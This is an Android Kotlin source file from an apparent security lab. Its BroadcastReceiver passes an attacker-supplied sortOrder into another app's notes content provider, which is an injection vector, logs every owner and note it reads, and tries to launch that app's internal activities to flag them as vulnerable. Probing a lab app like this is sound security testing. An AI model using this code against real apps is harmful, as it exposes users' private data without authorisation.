package com.lab.attacklab

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.util.Log

class QueryReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val uri = Uri.parse("content://com.lab.securenotes.provider/notes")
        val sortOrder = intent.getStringExtra("sortOrder")
        Log.d("AttackLab_QUERY", "using sortOrder=$sortOrder")
        try {
            val cursor = context.contentResolver.query(uri, null, null, null, sortOrder)
            var rowCount = 0
            cursor?.use {
                while (it.moveToNext()) {
                    rowCount++
                    Log.d("AttackLab_QUERY", "owner=${it.getString(1)} content=${it.getString(2)}")
                }
            }
            Log.d("AttackLab_QUERY", "query finished, rows found: $rowCount")
        } catch (e: SecurityException) {
            Log.d("AttackLab_QUERY", "query bloquee (SecurityException: ${e.message})")
        }

        tryLaunch(context, "com.lab.securenotes.NoteDetailActivity")
        tryLaunch(context, "com.lab.securenotes.ProfilActivity")
    }

    private fun tryLaunch(context: Context, className: String) {
        try {
            val i = Intent()
            i.setClassName("com.lab.securenotes", className)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(i)
            Log.d("AttackLab_LAUNCH", "$className -> lancement reussi (VULNERABLE)")
        } catch (e: SecurityException) {
            Log.d("AttackLab_LAUNCH", "$className -> bloque (SecurityException: ${e.message})")
        }
    }
}




